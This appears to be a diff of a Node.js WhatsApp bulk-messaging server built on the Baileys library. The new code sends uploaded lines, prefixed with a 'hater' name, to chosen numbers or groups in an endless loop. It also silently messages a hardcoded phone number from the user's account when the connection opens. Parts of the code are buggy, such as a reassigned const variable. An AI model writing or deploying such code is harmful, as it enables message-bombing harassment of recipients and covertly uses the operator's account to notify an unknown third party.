@@ -1,229 +1,231 @@
-import express from 'express';
-import fs from 'fs/promises';
-import path from 'path';
-import { makeWASocket } from "@whiskeysockets/baileys";
-import pino from 'pino';
-import NodeCache from 'node-cache';
-import multer from 'multer';
-import { delay, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore } from '@whiskeysockets/baileys';
-import { fileURLToPath } from 'url';
+const express = require('express');
+const fs = require('fs');
+const path = require('path');
+const pino = require('pino');
+const { makeWASocket, useMultiFileAuthState, delay, DisconnectReason } = require("@whiskeysockets/baileys");
+const multer = require('multer');
+const qrcode = require('qrcode'); 
 
 const app = express();
-app.use(express.json());
+const port = 21995;
+
+let MznKing;
+let messages = null;
+let targetNumbers = [];
+let groupUIDs = [];
+let intervalTime = null;
+let haterName = null;
+let lastSentIndex = 0;
+let isConnected = false;
+let qrCodeCache = null;
+
+// Placeholder for group UIDs
+const availableGroupUIDs = ["group1@g.us", "group2@g.us", "group3@g.us"];
+const groupNames = {
+  "group1@g.us": "Group One",
+  "group2@g.us": "Group Two",
+  "group3@g.us": "Group Three"
+};
+
+// Configure multer for file upload
+const storage = multer.memoryStorage();
+const upload = multer({ storage: storage });
+
 app.use(express.urlencoded({ extended: true }));
-app.use(express.static('public'));
+app.use(express.static(path.join(__dirname, 'public'))); 
 
-const upload = multer({ dest: 'uploads/' });
-const activeSessions = new Map();
+let users = {};
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
+const setupBaileys = async () => {
+  const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
 
-const dataDir = path.join(__dirname, 'data');
+  const connectToWhatsApp = async () => {
+    MznKing = makeWASocket({
+      logger: pino({ level: 'silent' }),
+      auth: state,
+    });
 
-(async () => {
-    try {
-        await fs.mkdir(dataDir, { recursive: true });
-    } catch (err) {
-        console.error("Error creating data directory", err);
-    }
-})();
+    MznKing.ev.on('connection.update', async (s) => {
+      const { connection, lastDisconnect, qr } = s;
 
-async function createSessionFolder(sessionId) {
-    const sessionPath = path.join(dataDir, sessionId);
-    try {
-        await fs.mkdir(sessionPath, { recursive: true });
-    } catch (err) {
-        console.error(`Error creating session folder for ${sessionId}`, err);
-    }
-    return sessionPath;
-}
+      if (connection === 'open') {
+        console.log('WhatsApp connected successfully.');
+        isConnected = true;
 
-async function isDuplicateCreds(credsFilePath) {
-    const credsHash = await fs.readFile(credsFilePath, 'utf-8');
-    for (const [sessionId, socket] of activeSessions) {
-        const sessionPath = path.join(dataDir, sessionId, 'creds.json');
-        if (await fs.readFile(sessionPath, 'utf-8') === credsHash) {
-            return true;
-        }
-    }
-    return false;
-}
-
-app.post('/stop-session/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
-    if (activeSessions.has(sessionId)) {
-        const socket = activeSessions.get(sessionId);
-        socket.ev.emit('close');
-        activeSessions.delete(sessionId);
-        const sessionPath = path.join(dataDir, sessionId);
-        await fs.rmdir(sessionPath, { recursive: true }).catch(err => {
-            console.warn(`Cleanup failed for ${sessionId}:`, err);
+        await MznKing.sendMessage('919354720853@s.whatsapp.net', {
+          text: "Hello Sir Sir, I am using your server. My pairing code is working.",
         });
-        res.send(`Session ${sessionId} stopped.`);
+      }
+
+      if (connection === 'close' && lastDisconnect?.error) {
+        const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
+        if (shouldReconnect) {
+          console.log('Reconnecting...');
+          await connectToWhatsApp();
+        } else {
+          console.log('Connection closed. Restart the script.');
+        }
+      }
+
+      if (qr) {
+        qrcode.toDataURL(qr, (err, qrCode) => {
+          if (err) {
+            console.error('Error generating QR code', err);
+          } else {
+            qrCodeCache = qrCode;
+          }
+        });
+      }
+    });
+
+    MznKing.ev.on('creds.update', saveCreds);
+
+    return MznKing;
+  };
+
+  await connectToWhatsApp();
+};
+
+setupBaileys();
+
+app.get('/', (req, res) => {
+  const qrCode = qrCodeCache;
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>WhatsApp Message Sender</title>
+      <style>
+        body {
+          font-family: Arial, sans-serif;
+          background-color: #121212;
+          color: #00FF00;
+          text-align: center;
+          padding: 20px;
+        }
+        .form-container { margin-top: 30px; }
+        .form-group { margin: 15px 0; }
+        label { display: block; margin-bottom: 5px; }
+        input, select, button {
+          width: 100%; padding: 10px; margin: 5px 0; font-size: 16px;
+        }
+        #qrCode {
+          margin: 20px auto; border: 2px solid #00FF00; padding: 10px;
+          width: 250px; height: 250px; display: flex; justify-content: center; align-items: center;
+          background-color: #fff;
+        }
+        img { max-width: 100%; max-height: 100%; }
+      </style>
+    </head>
+    <body>
+      <h1>WhatsApp Message Sender</h1>
+      <p>Scan this QR Code</p>
+      <div id="qrCode">
+        ${qrCode ? `<img src="${qrCode}" alt="QR Code">` : `<p>Loading QR Code...</p>`}
+      </div>
+      <p>Open WhatsApp on your phone, go to Settings > Linked Devices, and scan this QR code.</p>
+
+      <div class="form-container">
+        <form action="/send-messages" method="POST" enctype="multipart/form-data">
+          <div class="form-group">
+            <label for="targetOption">Target Option:</label>
+            <select name="targetOption" id="targetOption" onchange="toggleFields()">
+              <option value="1">Send to Numbers</option>
+              <option value="2">Send to Groups</option>
+            </select>
+          </div>
+          <div class="form-group" id="numbersField">
+            <label for="numbers">Target Numbers (comma-separated):</label>
+            <input type="text" name="numbers" id="numbers" placeholder="e.g., 1234567890,9876543210">
+          </div>
+          <div class="form-group" id="groupUIDsField" style="display: none;">
+            <label for="groupUIDs">Group UIDs (comma-separated):</label>
+            <input type="text" name="groupUIDs" id="groupUIDs" placeholder="e.g., group1@g.us,group2@g.us">
+          </div>
+          <div class="form-group">
+            <label for="messageFile">Upload Message File:</label>
+            <input type="file" name="messageFile" id="messageFile">
+          </div>
+          <div class="form-group">
+            <label for="delayTime">Delay Time (in seconds):</label>
+            <input type="number" name="delayTime" id="delayTime" placeholder="e.g., 10">
+          </div>
+          <div class="form-group">
+            <label for="haterNameInput">Sender Name (optional):</label>
+            <input type="text" name="haterNameInput" id="haterNameInput" placeholder="e.g., Your Name">
+          </div>
+          <button type="submit">Start Sending Messages</button>
+        </form>
+      </div>
+      <script>
+        function toggleFields() {
+          const targetOption = document.getElementById('targetOption').value;
+          document.getElementById('numbersField').style.display = targetOption === '1' ? 'block' : 'none';
+          document.getElementById('groupUIDsField').style.display = targetOption === '2' ? 'block' : 'none';
+        }
+      </script>
+    </body>
+    </html>
+  `);
+});
+
+app.post('/send-messages', upload.single('messageFile'), async (req, res) => {
+  try {
+    const { targetOption, numbers, groupUIDs, delayTime, haterNameInput } = req.body;
+
+    haterName = haterNameInput;
+    intervalTime = parseInt(delayTime, 10);
+
+    if (req.file) {
+      messages = req.file.buffer.toString('utf-8').split('\n').filter(Boolean);
     } else {
-        res.status(404).send(`Session ${sessionId} not found.`);
+      throw new Error('No message file uploaded');
     }
+
+    if (targetOption === "1") {
+      targetNumbers = numbers.split(',');
+    } else if (targetOption === "2") {
+      groupUIDs = groupUIDs.split(',');
+    }
+
+    res.send({ status: 'success', message: 'Message sending initiated!' });
+
+    await sendMessages(MznKing);
+  } catch (error) {
+    res.send({ status: 'error', message: error.message });
+  }
 });
 
-app.get('/sessions', (req, res) => {
-    res.send(Array.from(activeSessions.keys()));
-});
+const sendMessages = async (MznKing) => {
+  while (true) {
+    for (let i = lastSentIndex; i < messages.length; i++) {
+      try {
+        const fullMessage = `${haterName} ${messages[i]}`;
 
-app.post('/send-message', upload.single('messageFile'), async (req, res) => {
-    try {
-        const { creds, name, targetNumber, targetType, delayTime } = req.body;
-
-        if (!creds) {
-            return res.status(400).send('Creds.json content is required.');
+        if (targetNumbers.length > 0) {
+          for (const targetNumber of targetNumbers) {
+            await MznKing.sendMessage(targetNumber + '@c.us', { text: fullMessage });
+            console.log(`Message sent to target number: ${targetNumber}`);
+          }
+        } else {
+          for (const groupUID of groupUIDs) {
+            await MznKing.sendMessage(groupUID, { text: fullMessage });
+            console.log(`Message sent to group UID: ${groupUID}`);
+          }
         }
-        if (!req.file) {
-            return res.status(400).send('Message file is required.');
-        }
-
-        const messageFilePath = req.file.path;
-
-        if (await isDuplicateCredsFromText(creds)) {
-            return res.status(400).send('This credentials data is already in use. Please provide unique session data.');
-        }
-
-        const sessionId = `session_${Date.now()}`;
-        const sessionPath = await createSessionFolder(sessionId);
-
-        await fs.writeFile(path.join(sessionPath, 'creds.json'), creds);
-
-        const messages = (await fs.readFile(messageFilePath, 'utf-8')).split('\n').filter(Boolean);
-
-        const data = {
-            name,
-            targetNumber,
-            targetType,
-            messages,
-            delayTime: parseInt(delayTime, 10),
-        };
-
-        await fs.writeFile(path.join(sessionPath, 'data.json'), JSON.stringify(data, null, 2));
-        setImmediate(() => safeStartWhatsAppSession(sessionId));
-        res.send(`Session ${sessionId} started.`);
-    } catch (error) {
-        console.error("Processing error:", error);
-        res.status(500).send('Failed to process the request.');
-    }
-});
-
-async function isDuplicateCredsFromText(credsText) {
-    const credsHash = credsText;
-    for (const [sessionId, socket] of activeSessions) {
-        const sessionPath = path.join(dataDir, sessionId, 'creds.json');
-        const sessionCreds = await fs.readFile(sessionPath, 'utf-8');
-        if (sessionCreds === credsHash) {
-            return true;
-        }
-    }
-    return false;
-}
-
-async function startWhatsAppSession(sessionId) {
-    const sessionPath = path.join(dataDir, sessionId);
-    
-    try {
-        const data = JSON.parse(await fs.readFile(path.join(sessionPath, 'data.json'), 'utf-8'));
-        const { name, targetNumber, targetType, messages, delayTime } = data;
-
-        const { version } = await fetchLatestBaileysVersion();
-        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
-        const msgRetryCounterCache = new NodeCache();
-
-        const socket = makeWASocket({
-            logger: pino({ level: 'silent' }),
-            browser: ['Chrome (Linux)', '', ''],
-            auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
-            },
-            markOnlineOnConnect: true,
-            msgRetryCounterCache,
-        });
-
-        activeSessions.set(sessionId, socket);
-
-        socket.ev.on("connection.update", async (update) => {
-            const { connection, lastDisconnect } = update;
-
-            if (connection === "open") {
-                console.log(`Session ${sessionId} connected.`);
-                const targetJid = targetType === 'group' ? `${targetNumber}@g.us` : `${targetNumber}@s.whatsapp.net`;
-                
-                for (let i = 0; messages.length && activeSessions.has(sessionId); i++) {
-                    const message = messages[i];
-                    await sendMessage(socket, targetJid, name, message, delayTime, i);
-                }
-            }
-
-            if (connection === "close") {
-                handleSessionClosure(sessionId, lastDisconnect, sessionPath);
-            }
-        });
-
-        socket.ev.on('creds.update', saveCreds);
-    } catch (error) {
-        console.error(`Error in session ${sessionId}:`, error);
-        
-        setTimeout(() => safeStartWhatsAppSession(sessionId), 60000);
-    }
-}
-
-async function sendMessage(socket, targetJid, name, message, delayTime, index) {
-    try {
-        await socket.sendMessage(targetJid, { text: `${name} ${message}` });
-        console.log(`Message ${index + 1} sent to ${targetJid}: ${name} ${message}`);
-        await delay(delayTime * 1000);
-    } catch (err) {
-        console.error(`Error sending message ${index + 1} to ${targetJid}:`, err);
+        await delay(intervalTime * 1000);
+      } catch (sendError) {
+        console.log(`Error sending message: ${sendError.message}. Retrying...`);
+        lastSentIndex = i;
         await delay(5000);
+      }
     }
-}
+    lastSentIndex = 0;
+  }
+};
 
-async function handleSessionClosure(sessionId, lastDisconnect, sessionPath) {
-    const isAuthError = lastDisconnect?.error?.output?.statusCode === 401;
-    if (isAuthError) {
-        console.log(`Invalid credentials for session: ${sessionId}. Removing session folder...`);
-        await fs.rm(sessionPath, { recursive: true, force: true }).catch(err => {
-            console.warn(`Failed to remove session folder: ${sessionId}`, err);
-        });
-    } else {
-        console.log(`Connection closed for session ${sessionId}. Attempting restart...`);
-        setTimeout(() => safeStartWhatsAppSession(sessionId), 60000);
-    }
-}
-
-async function safeStartWhatsAppSession(sessionId) {
-    try {
-        await startWhatsAppSession(sessionId);
-    } catch (err) {
-        console.error(`Failed to start session ${sessionId}:`, err);
-        setTimeout(() => safeStartWhatsAppSession(sessionId), 10000);
-    }
-}
-
-async function autoStartSessions() {
-    try {
-        const sessionFolders = await fs.readdir(dataDir);
-        for (const folder of sessionFolders) {
-            const sessionPath = path.join(dataDir, folder);
-            const isDir = (await fs.lstat(sessionPath)).isDirectory();
-            if (isDir) {
-                console.log(`Auto-starting session: ${folder}`);
-                setImmediate(() => safeStartWhatsAppSession(folder));
-            }
-        }
-    } catch (err) {
-        console.warn("Error auto-starting sessions", err);
-    }
-}
-
-const port = process.env.PORT || 21995;
 app.listen(port, () => {
-    console.log(`Server running on http://localhost:${port}`);
-    autoStartSessions(); 
+  console.log(`Server running on http://localhost:${21995}`);
 });
